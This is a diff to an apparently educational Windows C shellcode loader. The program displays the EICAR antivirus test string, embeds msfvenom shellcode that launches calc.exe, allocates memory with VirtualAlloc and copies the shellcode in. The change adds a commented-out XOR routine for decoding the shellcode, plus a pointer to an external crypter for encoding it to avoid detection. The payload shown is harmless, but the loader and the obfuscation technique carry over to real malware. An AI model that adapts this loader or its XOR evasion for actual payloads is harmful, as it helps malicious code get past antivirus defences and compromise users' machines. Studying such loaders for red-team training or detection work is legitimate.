@@ -1,4 +1,4 @@
-//EDU for hiding imports
+//EDU for xor shellcode
 
 #include <Windows.h>
 #include <stdio.h>
@@ -42,6 +42,14 @@ void rot13(char* str) {
 		}
 	}
 }
+//XOR
+/*void XorShellcode(IN PBYTE pShellcode, IN SIZE_T dwSize, IN BYTE bKey)
+{
+	for (SIZE_T i = 0; i < dwSize; i++)
+	{
+		pShellcode[i] = pShellcode[i] ^ bKey;
+	}
+}*/
 
 
 int main() {
@@ -56,7 +64,8 @@ int main() {
 	const char* eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
 	MessageBoxA(NULL, eicar, "Fancy looking string : )", MB_OK | MB_ICONINFORMATION);
 
-	// Shellcode to launch calc.exe; not encoded or anything fancy
+	// Shellcode to launch calc.exe; encode with SimpleCrypter if needed and uncomment the function
+	// https://github.com/keks411/SimpleCrypter
 	//msfvenom -p windows/x64/exec CMD=calc.exe -f c
 	unsigned char buf[] = 
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
@@ -99,6 +108,11 @@ int main() {
 	else {
 		printf("[+] VirtualAlloc succeeded. Address: %p\n", hVirtualAlloc);
 	}
+
+	// Xor decode shellcode
+	//printf("Press Enter to xor decode shellcode...\n");
+	//getchar();
+	//XorShellcode(buf, dwSize, 0x69);
 
 	// Copy shellcode to allocated memory
 	printf("Press Enter to copy shellcode into new area...\n");
